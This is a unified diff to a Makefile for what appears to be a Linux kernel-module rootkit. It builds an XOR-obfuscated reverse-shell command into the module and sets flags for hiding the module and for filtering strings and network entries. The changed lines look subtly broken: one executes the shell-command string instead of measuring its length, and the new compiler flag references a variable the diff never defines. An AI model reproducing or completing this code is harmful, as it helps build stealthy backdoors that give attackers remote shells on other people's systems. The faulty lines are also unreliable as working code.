@@ -21,7 +21,9 @@ endif
 
 # xor RSHELL_CMD
 DRSHELL_CMD_OBF := $(shell \
-  for c in $$(echo -n "$(RSHELL_CMD)" | sed 's/./& /g'); do \
+  RSHELL_STR="$(RSHELL_CMD)"; \
+  for (( i=0; i<$$(${RSHELL_STR} | wc -c); i++ )); do \
+    c=$$(printf '%s' "$$RSHELL_STR" | cut -b$$((i+1))); \
     printf "'\\x%02x', " $$(( $$(printf '%d' "'$$c") ^ $(XOR_KEY) )); \
   done; \
   echo "'\\x00'"; \
@@ -43,7 +45,7 @@ EXTRA_CFLAGS += -I$(PWD)/include \
                 -DMODULE_NAME=\"$(MODULE_NAME)\" \
                 -DSTRING_EXCLUDES=\"$(STRING_EXCLUDES)\" \
                 -DNET_EXCLUDES=\"$(NET_EXCLUDES)\" \
-				-DRSHELL_CMD_OBF="{ $(DRSHELL_CMD_OBF) }" \
+				-DRSHELL_CMD_OBF="{ $(RSHELL_CMD_OBF) }" \
 				-DXOR_KEY=$(XOR_KEY)
 
 ifeq ($(HIDE_MODULE),1)
